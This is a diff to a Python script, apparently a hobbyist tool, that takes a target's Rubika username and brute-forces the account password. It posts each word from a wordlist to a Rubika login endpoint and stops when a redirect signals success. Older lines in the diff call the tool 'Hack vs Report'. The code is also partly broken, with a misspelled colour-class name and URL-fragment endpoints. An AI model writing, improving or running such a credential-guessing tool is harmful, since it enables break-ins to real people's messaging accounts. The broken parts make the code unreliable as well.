@@ -1,4 +1,5 @@
 #py3
+# coded by mmd
 from sys import flags
 import requests,time
 import os
@@ -15,9 +16,23 @@ class colorma:
     UNDER = '\033[4m'
     #--- ITS END ---
     END = '\033[0m'
-print ("L0AD..")
-os.system("pip install requests")
+print ()
+ins = input ("install requests (y/n)-? ⟩⟩> ")
+
+if ins == "y".lower():
+    print ()
+    os.system("pip install requests --upgrade")
+    print ()
+
+if ins == "n".lower():
+    print ()
+
 os.system("clear")
+time.sleep(1)
+print ()
+name = input (f"{colorama.GREEN}please enter your name ⟩⟩ ")
+print ("\n"*10)
+time.sleep(1)
 user = input(f"""{colorma.YELLOW}
 
 
@@ -42,7 +57,8 @@ dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
                         XP^X' b   d' X^XX
                         X. 9         P )X
                          b          '  d'
-                          Hack vs Report
+
+                         
 
 
 
@@ -51,24 +67,15 @@ dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
 
 
 
+ [https://web.rubika.ir/#c=uxxxxxxxx]
 
-
-You can both hack and report with lots of spam!
-
-
-[?]-Please Enter User Rubika Target-
-
-
-[https://web.rubika.ir/#c=uxxxxxxxx]
-
- OR 
-
-[https://web.rubika.ir/#im?um=@xxxx] 
+ [https://web.rubika.ir/#im?um=@xxxx] 
                      
                     
 
 
-                 --Type user-- _:>>>{colorma.END} """)
+ please enter username target- type user ⟩⟩ {colorma.END}""")
+print ()
 users = user.split(".")
 try:
     if(users[1] == 'rubika'):
@@ -109,16 +116,16 @@ try:
 
                 while shekan:
                     for word in wordlist:
-                        Target = requests.post("https://web.rubika.ir/#im?um=",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
-                        # Target = requests.post("http://127.0.0.1:8090/Login.php",data={"usrid":{users},"ups":word,"sub":"submit"}).text
+                        Target = requests.post("https://web.rubika.ir/#login/",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
+                        # Target = requests.post("http://web.rubika.ir/#im?um=",data={"usrid":{users},"ups":word,"sub":"submit"}).text
 
                         try:
                             if(Target.status_code == 302):
-                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [ok spam] : {colorma.END}{colorma.CYAN}{word}")
+                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [played] : {colorma.END}{colorma.CYAN}{word}")
                                 shekan = False
                                 break
                             else:
-                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [Cods spam] : {colorma.END}{colorma.RED}{word}")
+                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [yes spam] : {colorma.END}{colorma.RED}{word}")
                         except:
                             print(f"{colorma.RED}[X] Error Net : No Internet{colorma.END}")
                             shekan = False        
@@ -132,3 +139,7 @@ try:
         print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}")
 except:
     print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}") 
+
+
+
+# ended
